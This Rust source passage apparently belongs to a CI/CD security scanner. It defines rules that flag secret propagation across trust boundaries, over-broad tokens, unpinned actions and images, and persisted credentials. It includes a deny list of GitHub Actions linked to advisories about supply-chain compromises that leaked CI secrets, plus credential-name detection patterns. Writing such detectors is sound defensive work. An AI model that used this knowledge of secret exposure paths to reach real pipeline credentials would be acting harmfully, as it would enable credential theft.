use crate::finding::{
    Finding, FindingCategory, FindingExtras, FindingSource, Recommendation, Severity,
};
use crate::graph::{
    is_docker_digest_pinned, is_pin_semantically_valid, AuthorityGraph, EdgeKind, IdentityScope,
    Node, NodeId, NodeKind, TrustZone, META_ADD_SPN_TO_ENV, META_ATTESTS, META_CACHE_KEY,
    META_CHECKOUT_REF, META_CHECKOUT_SELF, META_CLI_FLAG_EXPOSED, META_CONDITION, META_CONTAINER,
    META_DIGEST, META_DISPATCH_INPUTS, META_DOTENV_FILE, META_DOWNLOADS_ARTIFACT,
    META_ENVIRONMENT_NAME, META_ENVIRONMENT_URL, META_ENV_APPROVAL,
    META_ENV_GATE_WRITES_SECRET_VALUE, META_FORK_CHECK, META_GHA_ACTION, META_GHA_WITH_INPUTS,
    META_GITLAB_ALLOW_FAILURE, META_GITLAB_CACHE_KEY, META_GITLAB_CACHE_POLICY,
    META_GITLAB_DIND_SERVICE, META_GITLAB_EXTENDS, META_GITLAB_INCLUDES, META_GITLAB_TRIGGER_KIND,
    META_IDENTITY_SCOPE, META_IMPLICIT, META_INTERACTIVE_DEBUG, META_INTERPRETS_ARTIFACT,
    META_JOB_NAME, META_JOB_OUTPUTS, META_NEEDS, META_NO_WORKFLOW_PERMISSIONS, META_OIDC,
    META_OIDC_AUDIENCE, META_PERMISSIONS, META_PLATFORM, META_READS_ENV, META_REPOSITORIES,
    META_RULES_PROTECTED_ONLY, META_SCRIPT_BODY, META_SECRETS_INHERIT, META_SELF_HOSTED,
    META_SERVICE_CONNECTION, META_SERVICE_CONNECTION_NAME, META_SETVARIABLE_ADO,
    META_TERRAFORM_AUTO_APPROVE, META_TRIGGER, META_TRIGGERS, META_VARIABLE_GROUP,
    META_WORKSPACE_CLEAN, META_WRITES_ENV_GATE,
};
use crate::propagation;

/// MVP Rule 1: Authority (secret/identity) propagated across a trust boundary.
///
/// **Clustering (v0.9.x):** all paths from the same root authority node
/// (Secret/Identity) collapse into ONE finding per source. The single
/// finding carries every reached sink in `nodes_involved` — `[source,
/// sink_a, sink_b, ...]` — and lists them in the message. This matches
/// the SARIF fingerprint behaviour (which already collapses per
/// `root_authority_node_name`) and removes the alert-fatigue cliff seen
/// on the GHA corpus where one `GITHUB_TOKEN` could produce 8+ near-
/// identical findings as it propagated through a matrix workflow.
///
/// Severity graduation (per-path, then max-over-paths):
/// - Untrusted sink: Critical (real risk — unpinned code with authority)
/// - SHA-pinned ThirdParty sink: High (immutable code, but still cross-boundary)
/// - SHA-pinned sink + constrained identity: Medium (lowest-risk form — read-only
///   token to immutable third-party code, e.g. `contents:read` → `actions/checkout@sha`)
///
/// When every path in a cluster crosses an environment approval gate,
/// the cluster's severity is downgraded one step (mirroring the
/// per-path downgrade the previous emitter applied).
pub fn authority_propagation(graph: &AuthorityGraph, max_hops: usize) -> Vec<Finding> {
    let paths = propagation::propagation_analysis(graph, max_hops);

    // Group by root authority source node. We preserve insertion order so
    // findings come out in the same order they would have under per-hop
    // emission (callers and golden-file tests rely on the source-first
    // ordering of authority_propagation findings).
    let mut order: Vec<NodeId> = Vec::new();
    let mut groups: std::collections::HashMap<NodeId, Vec<propagation::PropagationPath>> =
        std::collections::HashMap::new();

    for path in paths.into_iter().filter(|p| p.crossed_boundary) {
        groups
            .entry(path.source)
            .or_insert_with(|| {
                order.push(path.source);
                Vec::new()
            })
            .push(path);
    }

    let mut findings = Vec::with_capacity(order.len());

    for source_id in order {
        let paths = match groups.remove(&source_id) {
            Some(p) if !p.is_empty() => p,
            _ => continue,
        };

        let source_name = graph
            .node(source_id)
            .map(|n| n.name.as_str())
            .unwrap_or("?")
            .to_string();
        let source_is_constrained = graph
            .node(source_id)
            .and_then(|n| n.metadata.get(META_IDENTITY_SCOPE))
            .map(|s| s == "constrained")
            .unwrap_or(false);
        let source_is_oidc = graph
            .node(source_id)
            .and_then(|n| n.metadata.get(META_OIDC))
            .map(|v| v == "true")
            .unwrap_or(false);

        // Walk every path in the cluster and compute (severity, gated?,
        // sink id, representative path) — the cluster takes the max
        // severity (i.e. the worst sink wins). Severity is downgraded
        // only when every path in the cluster crosses an env-approval
        // gate; if even one path bypasses the gate, the cluster is not
        // downgraded.
        let mut worst_sev = Severity::Info;
        let mut all_gated = true;
        let mut best_path: Option<propagation::PropagationPath> = None;
        let mut sink_ids: Vec<NodeId> = Vec::new();
        let mut seen_sinks = std::collections::HashSet::new();

        for path in &paths {
            let sink_is_pinned = graph
                .node(path.sink)
                .map(|n| {
                    n.trust_zone == TrustZone::ThirdParty && n.metadata.contains_key(META_DIGEST)
                })
                .unwrap_or(false);

            let base_severity = if sink_is_pinned && source_is_constrained && !source_is_oidc {
                Severity::Medium
            } else if sink_is_pinned && !source_is_oidc {
                Severity::High
            } else {
                Severity::Critical
            };

            let gated = path_crosses_env_approval(graph, path);
            let effective_severity = if gated {
                downgrade_one_step(base_severity)
            } else {
                base_severity
            };

            if !gated {
                all_gated = false;
            }

            if effective_severity < worst_sev {
                worst_sev = effective_severity;
                best_path = Some(path.clone());
            }

            if seen_sinks.insert(path.sink) {
                sink_ids.push(path.sink);
            }
        }

        // Build sink name list for the message. Truncate aggressively past
        // ~5 names to avoid an unbounded message string on extreme inputs;
        // the full set is still in `nodes_involved`.
        let mut sink_names: Vec<String> = sink_ids
            .iter()
            .filter_map(|id| graph.node(*id).map(|n| n.name.clone()))
            .collect();
        let truncated = if sink_names.len() > 5 {
            let extra = sink_names.len() - 5;
            sink_names.truncate(5);
            format!(", …+{extra} more")
        } else {
            String::new()
        };
        let sink_list = sink_names.join(", ");

        let suffix = if all_gated && !paths.is_empty() {
            " (mitigated: environment approval gate)"
        } else {
            ""
        };

        let mut nodes_involved = Vec::with_capacity(sink_ids.len() + 1);
        nodes_involved.push(source_id);
        nodes_involved.extend(sink_ids.iter().copied());

        let n = paths.len();
        let unique_sinks = sink_ids.len();
        let message = if unique_sinks == 1 {
            format!("{source_name} propagated to {sink_list} across trust boundary{suffix}")
        } else {
            format!(
                "{source_name} reaches {unique_sinks} sinks via authority propagation: [{sink_list}{truncated}]{suffix}"
            )
        };

        let _ = n; // path count retained in the cluster's `path` field; not surfaced separately

        findings.push(Finding {
            severity: worst_sev,
            category: FindingCategory::AuthorityPropagation,
            nodes_involved,
            message,
            recommendation: Recommendation::TsafeRemediation {
                command: "tsafe exec --ns <scoped-namespace> -- <command>".to_string(),
                explanation: format!("Scope {source_name} to only the steps that need it"),
            },
            path: best_path,
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

/// Returns true if any node touched by `path` (source, sink, or any edge
/// endpoint along the way) carries META_ENV_APPROVAL = "true".
fn path_crosses_env_approval(graph: &AuthorityGraph, path: &propagation::PropagationPath) -> bool {
    let has_marker = |id: NodeId| {
        graph
            .node(id)
            .and_then(|n| n.metadata.get(META_ENV_APPROVAL))
            .map(|v| v == "true")
            .unwrap_or(false)
    };

    if has_marker(path.source) || has_marker(path.sink) {
        return true;
    }

    for &edge_id in &path.edges {
        if let Some(edge) = graph.edge(edge_id) {
            if has_marker(edge.from) || has_marker(edge.to) {
                return true;
            }
        }
    }
    false
}

/// Reduce a severity by one step. Critical→High, High→Medium, Medium→Low.
/// Low and Info are already at the floor of meaningful reduction and are
/// returned unchanged.
fn downgrade_one_step(severity: Severity) -> Severity {
    match severity {
        Severity::Critical => Severity::High,
        Severity::High => Severity::Medium,
        Severity::Medium => Severity::Low,
        Severity::Low => Severity::Low,
        Severity::Info => Severity::Info,
    }
}

/// MVP Rule 2: Identity scope broader than actual usage.
///
/// Uses `IdentityScope` classification from the precision layer. Broad and
/// Unknown scopes are flagged — Unknown is treated as risky because if we
/// can't determine the scope, we shouldn't assume it's safe.
pub fn over_privileged_identity(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for identity in graph.nodes_of_kind(NodeKind::Identity) {
        let granted_scope = identity
            .metadata
            .get(META_PERMISSIONS)
            .cloned()
            .unwrap_or_default();

        // Use IdentityScope from metadata if set by parser, otherwise classify from permissions
        let scope = identity
            .metadata
            .get(META_IDENTITY_SCOPE)
            .and_then(|s| match s.as_str() {
                "broad" => Some(IdentityScope::Broad),
                "constrained" => Some(IdentityScope::Constrained),
                "unknown" => Some(IdentityScope::Unknown),
                _ => None,
            })
            .unwrap_or_else(|| IdentityScope::from_permissions(&granted_scope));

        // Broad or Unknown scope — flag it. Unknown is treated as risky.
        let (should_flag, severity) = match scope {
            IdentityScope::Broad => (true, Severity::High),
            IdentityScope::Unknown => (true, Severity::Medium),
            IdentityScope::Constrained => (false, Severity::Info),
        };

        if !should_flag {
            continue;
        }

        let accessor_steps: Vec<_> = graph
            .edges_to(identity.id)
            .filter(|e| e.kind == EdgeKind::HasAccessTo)
            .filter_map(|e| graph.node(e.from))
            .collect();

        if !accessor_steps.is_empty() {
            let scope_label = match scope {
                IdentityScope::Broad => "broad",
                IdentityScope::Unknown => "unknown (treat as risky)",
                IdentityScope::Constrained => "constrained",
            };

            // Service connections are ADO-portal-configured identities; their
            // scope is not governed by the pipeline-level `permissions:` YAML
            // block. Emit a distinct message and recommendation so users aren't
            // confused into thinking adding `permissions: contents: none` will
            // fix this finding.
            let is_service_connection = identity
                .metadata
                .get(META_SERVICE_CONNECTION)
                .map(|v| v == "true")
                .unwrap_or(false);

            let (message, recommendation) = if is_service_connection {
                (
                    format!(
                        "Service connection '{}' has {} scope — \
                         scope is controlled in the ADO portal, not by the pipeline \
                         permissions: YAML block",
                        identity.name, scope_label
                    ),
                    Recommendation::Manual {
                        action: format!(
                            "Narrow '{}' in ADO Project Settings → Service Connections → \
                             Security, or replace static credentials with workload identity \
                             federation (OIDC) so no long-lived secret is stored.",
                            identity.name
                        ),
                    },
                )
            } else {
                (
                    format!(
                        "{} has {} scope (permissions: '{}') — likely broader than needed",
                        identity.name, scope_label, granted_scope
                    ),
                    Recommendation::ReducePermissions {
                        current: granted_scope.clone(),
                        minimum: "{ contents: read }".into(),
                    },
                )
            };

            findings.push(Finding {
                severity,
                category: FindingCategory::OverPrivilegedIdentity,
                path: None,
                nodes_involved: std::iter::once(identity.id)
                    .chain(accessor_steps.iter().map(|n| n.id))
                    .collect(),
                message,
                recommendation,
                source: FindingSource::BuiltIn,
                // Working out the minimum-needed scope across N jobs is a
                // ~1 hour audit, not a flag flip — Small.
                extras: FindingExtras {
                    time_to_fix: Some(crate::finding::FixEffort::Small),
                    ..FindingExtras::default()
                },
            });
        }
    }

    findings
}

/// Rule: OIDC-capable identity reachable from an untrusted trigger context.
///
/// OIDC is the preferred replacement for long-lived secrets, but only when
/// the subject/audience constraints are bound to trusted refs or protected
/// environments. In PR/MR contexts, a job that can mint OIDC credentials is
/// still an authority-bearing job and should be split or gated.
pub fn oidc_identity_in_untrusted_context(graph: &AuthorityGraph) -> Vec<Finding> {
    if !graph_has_untrusted_trigger(graph) {
        return Vec::new();
    }

    let mut findings = Vec::new();
    for identity in graph.nodes_of_kind(NodeKind::Identity) {
        let is_oidc = identity
            .metadata
            .get(META_OIDC)
            .map(|v| v == "true")
            .unwrap_or(false);
        if !is_oidc {
            continue;
        }

        let mut steps = Vec::new();
        for edge in graph
            .edges_to(identity.id)
            .filter(|e| e.kind == EdgeKind::HasAccessTo)
        {
            let Some(step) = graph.node(edge.from) else {
                continue;
            };
            if !step_is_untrusted_context(step, graph) {
                continue;
            }
            steps.push(step);
        }
        if steps.is_empty() {
            continue;
        }
        steps.sort_by_key(|s| s.id);
        let mut nodes_involved = vec![identity.id];
        nodes_involved.extend(steps.iter().map(|s| s.id));
        let step_names = steps
            .iter()
            .take(5)
            .map(|s| s.name.as_str())
            .collect::<Vec<_>>()
            .join(", ");
        let suffix = if steps.len() > 5 {
            format!(", ...+{} more", steps.len() - 5)
        } else {
            String::new()
        };
        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::OverPrivilegedIdentity,
            path: None,
            nodes_involved,
            message: format!(
                "[oidc_identity_in_untrusted_context] OIDC identity '{}' is reachable from untrusted trigger steps [{}{}]",
                identity.name, step_names, suffix
            ),
            recommendation: Recommendation::Manual {
                action: "Move OIDC credential minting to a trusted-ref workflow or protect it with environment approvals and provider-side subject/audience conditions that exclude fork pull requests and untrusted merge requests.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::with_anchor(format!("identity={}", identity.name)),
        });
    }
    findings
}

fn graph_has_untrusted_trigger(graph: &AuthorityGraph) -> bool {
    graph
        .metadata
        .get(META_TRIGGER)
        .into_iter()
        .chain(graph.metadata.get(META_TRIGGERS))
        .flat_map(|s| s.split(','))
        .map(str::trim)
        .any(trigger_is_untrusted)
}

fn step_is_untrusted_context(step: &Node, graph: &AuthorityGraph) -> bool {
    step.metadata
        .get(META_TRIGGER)
        .map(|s| s.split(',').map(str::trim).any(trigger_is_untrusted))
        .unwrap_or_else(|| graph_has_untrusted_trigger(graph))
}

fn trigger_is_untrusted(trigger: &str) -> bool {
    matches!(
        trigger,
        "pull_request"
            | "pull_request_target"
            | "merge_request"
            | "merge_request_event"
            | "workflow_run"
            | "issue_comment"
            | "pull_request_review"
            | "pull_request_review_comment"
    )
}

/// MVP Rule 3: Third-party action/image without SHA pin.
///
/// **Severity tiering (v0.9.x):** the rule used to fire at a single severity
/// regardless of which action was unpinned, which produced uniform noise on
/// monorepo CI files where the action owner determined the actual risk.
/// The blue-team corpus report (`MEMORY/.../blueteam-corpus-defense.md`)
/// recommended splitting:
///   * Same-repo composite action (`./.github/actions/*`) → **Info**.
///     The action lives in the consumer's own repo — there's no external
///     supply-chain surface; pinning is a hygiene preference, not a
///     control gap.
///   * Owner is a well-known first-party org (`actions/*`, `github/*`,
///     `actions-rs/*`, `docker/*`) → **Medium**. These are GitHub-org or
///     adjacent tooling maintainers; the supply-chain surface exists but
///     is operationally narrow and well-monitored.
///   * Anything else (`random-org/foo@v1`, etc.) → **High**. Unbounded
///     supply-chain risk — this is the case the rule was originally
///     designed for.
///
/// Deduplicates by action reference — the same action used in multiple jobs
/// produces multiple Image nodes but should only be flagged once.
pub fn unpinned_action(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut seen = std::collections::HashSet::new();

    for image in graph.nodes_of_kind(NodeKind::Image) {
        // Container images are handled by floating_image — skip here to avoid
        // double-flagging the same node as both UnpinnedAction and FloatingImage.
        if image
            .metadata
            .get(META_CONTAINER)
            .map(|v| v == "true")
            .unwrap_or(false)
        {
            continue;
        }

        // Self-hosted runner labels live in the FirstParty zone but aren't
        // an action reference — they have no `@version` to pin and the rule
        // would otherwise flag every `runs-on: self-hosted` line.
        if image
            .metadata
            .get(META_SELF_HOSTED)
            .map(|v| v == "true")
            .unwrap_or(false)
        {
            continue;
        }

        // Same-repo composite actions (`./.github/actions/foo`) sit in the
        // FirstParty zone. Other FirstParty Image nodes (e.g. self-hosted
        // pool labels, hosted runner names) are not flaggable references —
        // we admit FirstParty into the severity ladder ONLY when the name
        // is the relative-path form, and emit Info for it.
        let is_local_composite = image.name.starts_with("./");
        if image.trust_zone == TrustZone::FirstParty && !is_local_composite {
            continue;
        }

        // Deduplicate: same action reference flagged once
        if !seen.insert(&image.name) {
            continue;
        }

        let has_digest = image.metadata.contains_key(META_DIGEST);

        if has_digest || is_pin_semantically_valid(&image.name) {
            continue;
        }

        // Tier severity by owner. `is_local_composite` already handled the
        // same-repo case; for everything else, look at the `<owner>/...`
        // prefix and decide first-party vs unknown supplier.
        let severity = if is_local_composite {
            Severity::Info
        } else if is_well_known_first_party_action(&image.name) {
            Severity::Medium
        } else {
            Severity::High
        };

        findings.push(Finding {
            severity,
            category: FindingCategory::UnpinnedAction,
            path: None,
            nodes_involved: vec![image.id],
            message: format!("{} is not pinned to a SHA digest", image.name),
            recommendation: Recommendation::PinAction {
                current: image.name.clone(),
                pinned: format!(
                    "{}@<sha256-digest>",
                    image.name.split('@').next().unwrap_or(&image.name)
                ),
            },
            source: FindingSource::BuiltIn,
            // Mechanical fix: replace `@v3` with `@<40-char-sha>`. ~5 min.
            extras: FindingExtras {
                time_to_fix: Some(crate::finding::FixEffort::Trivial),
                ..FindingExtras::default()
            },
        });
    }

    findings
}

/// Rule: `action_major_version_pin_without_sha`.
///
/// A `uses:` reference pinned only to a moving major tag (`@v1`, `@v2`, ...)
/// is reproducible only at the maintainer's current tag pointer, not at an
/// immutable commit. This is intentionally a refinement alongside
/// `unpinned_action`: it gives operators a stable filter for the most common
/// "looks pinned but is still mutable" shape.
pub fn action_major_version_pin_without_sha(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut seen = std::collections::HashSet::new();

    for image in graph.nodes_of_kind(NodeKind::Image) {
        if image
            .metadata
            .get(META_CONTAINER)
            .map(|v| v == "true")
            .unwrap_or(false)
            || image.metadata.contains_key(META_SELF_HOSTED)
            || image.trust_zone == TrustZone::FirstParty
        {
            continue;
        }
        if !seen.insert(image.name.as_str()) || is_pin_semantically_valid(&image.name) {
            continue;
        }
        if !action_ref_is_major_only(&image.name) {
            continue;
        }

        findings.push(Finding {
            severity: Severity::Medium,
            category: FindingCategory::UnpinnedAction,
            path: None,
            nodes_involved: vec![image.id],
            message: format!(
                "[action_major_version_pin_without_sha] {} is pinned only to a mutable major tag; pin to a full commit SHA",
                image.name
            ),
            recommendation: Recommendation::PinAction {
                current: image.name.clone(),
                pinned: format!(
                    "{}@<40-char-sha>",
                    image.name.split('@').next().unwrap_or(&image.name)
                ),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras {
                time_to_fix: Some(crate::finding::FixEffort::Trivial),
                ..FindingExtras::default()
            },
        });
    }

    findings
}

fn action_ref_is_major_only(action: &str) -> bool {
    let Some((_, r)) = action.rsplit_once('@') else {
        return false;
    };
    let r = r.trim();
    let digits = r.strip_prefix('v').unwrap_or(r);
    !digits.is_empty() && digits.chars().all(|c| c.is_ascii_digit())
}

struct KnownActionAdvisory {
    action: &'static str,
    advisory: &'static str,
    cve: &'static str,
    severity: Severity,
    note: &'static str,
}

const KNOWN_ACTION_ADVISORIES: &[KnownActionAdvisory] = &[
    KnownActionAdvisory {
        action: "tj-actions/changed-files",
        advisory: "GHSA-mrrh-fwg8-r2c3",
        cve: "CVE-2025-30066",
        severity: Severity::Critical,
        note: "supply-chain compromise leaked CI secrets in workflow logs",
    },
    KnownActionAdvisory {
        action: "reviewdog/action-setup",
        advisory: "GHSA-qmg3-hpqr-gqvc",
        cve: "CVE-2025-30154",
        severity: Severity::Critical,
        note: "compromise chain associated with reviewdog setup action",
    },
    KnownActionAdvisory {
        action: "reviewdog/action-shellcheck",
        advisory: "GHSA-qmg3-hpqr-gqvc",
        cve: "CVE-2025-30154",
        severity: Severity::High,
        note: "reviewdog wrapper action family; validate whether it pulled compromised setup code",
    },
];

/// Rule: `known_compromised_action_ref`.
///
/// Deterministic family match for public advisory-backed GitHub Actions
/// compromises that are visible from workflow YAML alone. This does not claim
/// a particular run was exploited; it gives auditors a high-confidence queue
/// for advisory review and historical run-window correlation.
pub fn known_compromised_action_ref(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut seen = std::collections::HashSet::new();

    for image in graph.nodes_of_kind(NodeKind::Image) {
        if image
            .metadata
            .get(META_CONTAINER)
            .map(|v| v == "true")
            .unwrap_or(false)
        {
            continue;
        }
        let bare = image
            .name
            .split('@')
            .next()
            .unwrap_or(image.name.as_str())
            .to_ascii_lowercase();
        let Some(advisory) = KNOWN_ACTION_ADVISORIES.iter().find(|a| bare == a.action) else {
            continue;
        };
        if !seen.insert((advisory.action, image.name.as_str())) {
            continue;
        }

        findings.push(Finding {
            severity: advisory.severity,
            category: FindingCategory::UnpinnedAction,
            path: None,
            nodes_involved: vec![image.id],
            message: format!(
                "[known_compromised_action_ref] {} matches {} / {} ({}) — correlate workflow run time and resolved SHA before claiming exploitability",
                image.name, advisory.cve, advisory.advisory, advisory.note
            ),
            recommendation: Recommendation::Manual {
                action: format!(
                    "Remove or upgrade `{}`; resolve the referenced tag/SHA, compare it with the advisory's affected window, and rotate any secrets reachable by jobs that used it.",
                    image.name
                ),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

/// Owners we treat as well-known first-party for the purpose of severity
/// tiering. The list is intentionally short and conservative — adding an
/// org here downgrades every unpinned action it ships, so the bar is
/// "GitHub-maintained or directly adjacent core tooling." Anything else
/// stays at the High default.
fn is_well_known_first_party_action(uses: &str) -> bool {
    // Strip an optional `@<ref>` suffix, then take the leading owner segment.
    let bare = uses.split('@').next().unwrap_or(uses);
    let owner = bare.split('/').next().unwrap_or("");
    matches!(owner, "actions" | "github" | "actions-rs" | "docker")
}

/// MVP Rule 4: Untrusted step has direct access to secret/identity.
pub fn untrusted_with_authority(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for step in graph.nodes_in_zone(TrustZone::Untrusted) {
        if step.kind != NodeKind::Step {
            continue;
        }

        // Check if this untrusted step directly accesses any authority source
        for edge in graph.edges_from(step.id) {
            if edge.kind != EdgeKind::HasAccessTo {
                continue;
            }

            if let Some(target) = graph.node(edge.to) {
                if matches!(target.kind, NodeKind::Secret | NodeKind::Identity) {
                    let cli_flag_exposed = target
                        .metadata
                        .get(META_CLI_FLAG_EXPOSED)
                        .map(|v| v == "true")
                        .unwrap_or(false);

                    // Platform-implicit tokens (e.g. ADO System.AccessToken) are structurally
                    // accessible to all tasks by design. Flag at Info — real but not actionable
                    // as a misconfiguration. Explicit secrets/service connections stay Critical.
                    let is_implicit = target
                        .metadata
                        .get(META_IMPLICIT)
                        .map(|v| v == "true")
                        .unwrap_or(false);

                    let recommendation = if target.kind == NodeKind::Secret {
                        if cli_flag_exposed {
                            Recommendation::Manual {
                                action: format!(
                                    "Move '{}' from -var flag to TF_VAR_{} env var — \
                                     -var values appear in pipeline logs and Terraform plan output",
                                    target.name, target.name
                                ),
                            }
                        } else {
                            Recommendation::CellosRemediation {
                                reason: format!(
                                    "Untrusted step '{}' has direct access to secret '{}'",
                                    step.name, target.name
                                ),
                                spec_hint: format!(
                                    "cellos run --network deny-all --broker env:{}",
                                    target.name
                                ),
                            }
                        }
                    } else {
                        // Identity branch — for implicit platform tokens, add a CellOS
                        // compensating-control note since the token cannot be un-injected
                        // at the platform layer.
                        let minimum = if is_implicit {
                            "minimal required scope — or use CellOS deny-all egress as a compensating control to limit exfiltration of the injected token".into()
                        } else {
                            "minimal required scope".into()
                        };
                        Recommendation::ReducePermissions {
                            current: target
                                .metadata
                                .get(META_PERMISSIONS)
                                .cloned()
                                .unwrap_or_else(|| "unknown".into()),
                            minimum,
                        }
                    };

                    let log_exposure_note = if cli_flag_exposed {
                        " (passed as -var flag — value visible in pipeline logs)"
                    } else {
                        ""
                    };

                    let (severity, message) =
                        if is_implicit {
                            (
                                Severity::Info,
                                format!(
                                "Untrusted step '{}' has structural access to implicit {} '{}' \
                                 (platform-injected — all tasks receive this token by design){}",
                                step.name,
                                if target.kind == NodeKind::Secret { "secret" } else { "identity" },
                                target.name,
                                log_exposure_note,
                            ),
                            )
                        } else {
                            (
                                Severity::Critical,
                                format!(
                                    "Untrusted step '{}' has direct access to {} '{}'{}",
                                    step.name,
                                    if target.kind == NodeKind::Secret {
                                        "secret"
                                    } else {
                                        "identity"
                                    },
                                    target.name,
                                    log_exposure_note,
                                ),
                            )
                        };

                    findings.push(Finding {
                        severity,
                        category: FindingCategory::UntrustedWithAuthority,
                        path: None,
                        nodes_involved: vec![step.id, target.id],
                        message,
                        recommendation,
                        source: FindingSource::BuiltIn,
                        extras: FindingExtras::default(),
                    });
                }
            }
        }
    }

    findings
}

/// MVP Rule 5: Artifact produced by privileged step consumed across trust boundary.
pub fn artifact_boundary_crossing(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for artifact in graph.nodes_of_kind(NodeKind::Artifact) {
        // Find producer(s)
        let producers: Vec<_> = graph
            .edges_to(artifact.id)
            .filter(|e| e.kind == EdgeKind::Produces)
            .filter_map(|e| graph.node(e.from))
            .collect();

        // Find consumer(s) — Consumes edges go artifact -> step
        let consumers: Vec<_> = graph
            .edges_from(artifact.id)
            .filter(|e| e.kind == EdgeKind::Consumes)
            .filter_map(|e| graph.node(e.to))
            .collect();

        for producer in &producers {
            for consumer in &consumers {
                // Skip intra-job pairs: upload → download within the same job
                // is a legitimate temp-file pattern. The trust crossing is only
                // meaningful when the artifact crosses a job boundary.
                let prod_job = producer
                    .metadata
                    .get(META_JOB_NAME)
                    .map(String::as_str)
                    .unwrap_or("");
                let cons_job = consumer
                    .metadata
                    .get(META_JOB_NAME)
                    .map(String::as_str)
                    .unwrap_or("");
                if !prod_job.is_empty() && prod_job == cons_job {
                    continue;
                }

                if producer.trust_zone.is_lower_than(&consumer.trust_zone) {
                    findings.push(Finding {
                        severity: Severity::High,
                        category: FindingCategory::ArtifactBoundaryCrossing,
                        path: None,
                        nodes_involved: vec![producer.id, artifact.id, consumer.id],
                        message: format!(
                            "Untrusted artifact '{}' produced by '{}' ({:?}) consumed by privileged step '{}' ({:?})",
                            artifact.name,
                            producer.name,
                            producer.trust_zone,
                            consumer.name,
                            consumer.trust_zone
                        ),
                        recommendation: Recommendation::Manual {
                            action: "Ensure the artifact producer runs in a trusted job; restrict which jobs can consume the artifact using platform-specific controls (e.g. environment protection rules, manual approval gates).".into(),
                        },
                        source: FindingSource::BuiltIn,
                        extras: FindingExtras::default(),
                    });
                }
            }
        }
    }

    findings
}

/// Stretch Rule 9: Secret name matches known long-lived/static credential pattern.
///
/// Heuristic: secrets named like AWS keys, API keys, passwords, or private keys
/// are likely static credentials that should be replaced with OIDC federation.
pub fn long_lived_credential(graph: &AuthorityGraph) -> Vec<Finding> {
    const STATIC_PATTERNS: &[&str] = &[
        "AWS_ACCESS_KEY",
        "AWS_SECRET_ACCESS_KEY",
        "_API_KEY",
        "_APIKEY",
        "_PASSWORD",
        "_PASSWD",
        "_PRIVATE_KEY",
        "_SECRET_KEY",
        "_SERVICE_ACCOUNT",
        "_SIGNING_KEY",
    ];

    let mut findings = Vec::new();

    for secret in graph.nodes_of_kind(NodeKind::Secret) {
        let upper = secret.name.to_uppercase();
        let is_static = STATIC_PATTERNS.iter().any(|p| upper.contains(p));

        if is_static {
            findings.push(Finding {
                severity: Severity::Low,
                category: FindingCategory::LongLivedCredential,
                path: None,
                nodes_involved: vec![secret.id],
                message: format!(
                    "'{}' looks like a long-lived static credential",
                    secret.name
                ),
                recommendation: Recommendation::FederateIdentity {
                    static_secret: secret.name.clone(),
                    oidc_provider: "GitHub Actions OIDC (id-token: write)".into(),
                },
                source: FindingSource::BuiltIn,
                // Migrating from PATs to OIDC across an org touches identity
                // policy, IAM trust relationships, and every downstream
                // consumer of the credential — Large effort.
                extras: FindingExtras {
                    time_to_fix: Some(crate::finding::FixEffort::Large),
                    ..FindingExtras::default()
                },
            });
        }
    }

    findings
}

/// Tier 6 Rule: Container image without Docker digest pinning.
///
/// Job-level containers marked with `META_CONTAINER` that aren't pinned to
/// `image@sha256:<64hex>` can be silently mutated between runs. Deduplicates
/// by image name (same image in multiple jobs flags once).
pub fn floating_image(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut seen = std::collections::HashSet::new();

    for image in graph.nodes_of_kind(NodeKind::Image) {
        let is_container = image
            .metadata
            .get(META_CONTAINER)
            .map(|v| v == "true")
            .unwrap_or(false);

        if !is_container {
            continue;
        }

        if !seen.insert(image.name.as_str()) {
            continue;
        }

        if !is_docker_digest_pinned(&image.name) {
            findings.push(Finding {
                severity: Severity::Medium,
                category: FindingCategory::FloatingImage,
                path: None,
                nodes_involved: vec![image.id],
                message: format!("Container image '{}' is not pinned to a digest", image.name),
                recommendation: Recommendation::PinAction {
                    current: image.name.clone(),
                    pinned: format!(
                        "{}@sha256:<digest>",
                        image.name.split(':').next().unwrap_or(&image.name)
                    ),
                },
                source: FindingSource::BuiltIn,
                // `docker pull <image>` once and append `@sha256:<digest>` —
                // identical mechanical fix to unpinned_action. Trivial.
                extras: FindingExtras {
                    time_to_fix: Some(crate::finding::FixEffort::Trivial),
                    ..FindingExtras::default()
                },
            });
        }
    }

    findings
}

/// Stretch Rule: checkout step with `persistCredentials: true` writes credentials to disk.
///
/// The PersistsTo edge connects a checkout step to the token it persists. Disk-resident
/// credentials are accessible to all subsequent steps (and to any process with filesystem
/// access), unlike runtime-only HasAccessTo authority which expires when the step exits.
pub fn persisted_credential(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for edge in &graph.edges {
        if edge.kind != EdgeKind::PersistsTo {
            continue;
        }

        let Some(step) = graph.node(edge.from) else {
            continue;
        };
        let Some(target) = graph.node(edge.to) else {
            continue;
        };

        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::PersistedCredential,
            path: None,
            nodes_involved: vec![step.id, target.id],
            message: format!(
                "'{}' persists '{}' to disk via persistCredentials: true — \
                 credential remains in .git/config and is accessible to all subsequent steps",
                step.name, target.name
            ),
            recommendation: Recommendation::Manual {
                action: "Remove persistCredentials: true from the checkout step. \
                         Pass credentials explicitly only to steps that need them."
                    .into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

/// Rule: dangerous trigger type (pull_request_target / pr) combined with secret/identity access.
///
/// Fires once per workflow when the graph-level `META_TRIGGER` indicates a high-risk
/// trigger and at least one step holds authority. Aggregates all involved nodes.
pub fn trigger_context_mismatch(graph: &AuthorityGraph) -> Vec<Finding> {
    let trigger = match graph.metadata.get(META_TRIGGER) {
        Some(t) => t.clone(),
        None => return Vec::new(),
    };

